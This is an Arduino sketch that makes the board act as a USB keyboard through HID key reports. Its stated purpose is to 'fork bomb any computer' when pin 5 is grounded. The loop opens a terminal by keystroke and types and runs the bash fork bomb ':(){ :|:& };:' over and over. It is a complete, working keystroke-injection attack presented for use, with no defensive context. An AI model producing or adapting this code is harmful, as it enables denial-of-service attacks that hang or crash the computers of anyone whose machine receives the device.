#define KB_ERROR_ROLL_OVER 1
#define KB_POSTFail 2
#define KB_ERROR_UNDEFINED 3
#define KB_A 4
#define KB_B 5
#define KB_C 6
#define KB_D 7
#define KB_E 8
#define KB_F 9
#define KB_G 10
#define KB_H 11 
#define KB_I 12
#define KB_J 13
#define KB_K 14
#define KB_L 15
#define KB_M 16
#define KB_N 17
#define KB_O 18
#define KB_P 19
#define KB_Q 20
#define KB_R 21
#define KB_S 22
#define KB_T 23
#define KB_U 24
#define KB_V 25
#define KB_W 26
#define KB_X 27
#define KB_Y 28
#define KB_Z 29
#define KB_1 30
#define KB_2 31
#define KB_3 32
#define KB_4 33
#define KB_5 34
#define KB_6 35
#define KB_7 36
#define KB_8 37
#define KB_9 38
#define KB_0 39
#define KB_ENTER 40
#define KB_ESCAPE 41
#define KB_DELETE 42
#define KB_TAB 43
#define KB_SPACE 44
#define KB_DASH 45
#define KB_EQUAL 46
#define KB_L_BRAC 47
#define KB_R_BRAC 48
#define KB_BACKSLASH 49
#define KB_TILDA 50
#define KB_SEMICOLON 51
#define KB_QUOTE 52
#define KB_COMA 54
#define KB_DOT 55
#define KB_FORWARD_SLASH 56
#define KB_CAPS_LOCK 57
#define F1 58
#define F2 59
#define F3 60
#define F4 61
#define F5 62
#define F6 63 
#define F7 64
#define F8 65 
#define F9 66
#define F10 67
#define F11 68
#define F12 69
#define KB_PRINTSCREEN 70
#define KB_R_ARROW 79
#define KB_L_ARROW 80
#define KB_D_ARROW 81
#define KB_U_ARROW 82
#define WINDOWS 227
#define CTRL 224
#define ALT 226
#define SHIFT 225

#define BUFSIZ 1024
#define DELAY_TIME 200

void kb_init();
void error();
void releaseKey();
void writeKey(int lettr, int hold, int attr);
void printKey(char str[BUFSIZ]);

uint8_t key[8] = {
	0 };

enum { HOLD = 1, DONT_HOLD = 0 };

void kb_init()
{
	Serial.begin(9600);
	delay(200);
}

void error()
{
 printKey("ERROR : This letter is not supported");
}

void releaseKey()
{
	key[0] = 0;
	key[2] = 0;
	key[4] = 0;
	Serial.write(key, 8);
}

void writeKey(int lettr, int hold, int attr)
{
	key[4] = lettr;
	key[2] = attr;
	Serial.write(key, 8);
	if(!(hold))
		releaseKey();
}

void printKey(char str[BUFSIZ])
{
	int temp;
	for( int i = 0; str[i] != '\0'; i++) {
		temp = 0;
		if((97 <= str[i]) && (str[i] <= 122)) {				//a-z
			temp = str[i] - 93;
			writeKey(temp, 0, 0);
		} else if((49 <= str[i]) && (str[i]<= 57)) {  		//1-9
			temp = str[i] - 19;
			writeKey(temp, 0, 0);
		} else if( (str[i] == 58) || (str[i] == 59) ) {		//[;]/[:]
			temp = KB_SEMICOLON;
			if( !(str[i] == 59) ){ // if :
				writeKey(temp, 0, SHIFT);
			} else {
				writeKey(temp, 0, 0);
			}
		} else if( (str[i] == 47) || (str[i] == 63)) {		//[/]/[?]
			temp = KB_FORWARD_SLASH;
			if(!(str[i] == 47)){
				writeKey(temp, 0, SHIFT);
			} else {
				writeKey(temp, 0, 0);
			}
		} else if((str[i] == 46) || (str[i] == 62)) {			//[dot]/[>]
			temp = KB_DOT;
			if(!(str[i] == 46)) {
				writeKey(temp, 0, SHIFT);
			} else {
				writeKey(temp, 0, 0);
			}
		} else if(str[i] == 32) {					//[SPACE]
			temp = KB_SPACE;
			writeKey(temp, 0, 0);
		} else if( (65 <= str[i]) && (str[i] <= 90)) {		//A-Z
			temp = str[i] - 61;
			writeKey(temp, 0, SHIFT);
		} else if( (40 == str[i]) || (str[i] == 41) || (str[i] == 38)){	//( & )
			temp = str[i] - 2;
			writeKey(temp, 0, SHIFT);
		} else if((str[i] == 91) || (str[i] == 123)) {		// [ / {
			temp = KB_L_BRAC;
			if(str[i] == 123){
				writeKey(temp, 0, SHIFT);
			} else {
				writeKey(temp, 0, 0);
			}
		} else if ((str[i] == 93) || (str[i] == 125)){		// ] / }
			temp = KB_R_BRAC;
			if(str[i] == 125) {
				writeKey(temp, 0, SHIFT);
			} else {
				writeKey(temp, 0, 0);
			}
		} else if((str[i] == 124) || (str[i] == 92)){			// [\] / [|]
			temp = KB_BACKSLASH;
			if(str[i] == 124) {
				writeKey(temp, 0, SHIFT);
			} else {
				writeKey(temp, 0, 0);
			}
		} else if(str[i] == 64){					//@
			temp = KB_2;
			writeKey(temp, 0, SHIFT);
		} else if(str[i] == 94) {					//^
			temp = KB_6;
			writeKey(temp, 0, SHIFT);
		} else if(str[i] == 42) {					//*
			temp = KB_8;
			writeKey(temp, 0, SHIFT);
		} else {
			error();
		}
	}
	delay(200);
}

/*
 * FORK BOMB ANY COMPUTER IF PIN 5 IS WIRED TO GROUND
 */
 
bool state;

void setup()
{
  pinMode(5, INPUT);
  digitalWrite(5, 1);
  kb_init();
}
void loop()
{
  state = digitalRead(5);
  if(state != 1) {
    writeKey(WINDOWS, 0, 0);
    delay(500);
    printKey("terminal");
    writeKey(KB_ENTER, 0, 0);
    delay(500);
    printKey(":(){ :|:& };:");
    writeKey(KB_ENTER, 0, 0);
  }
}
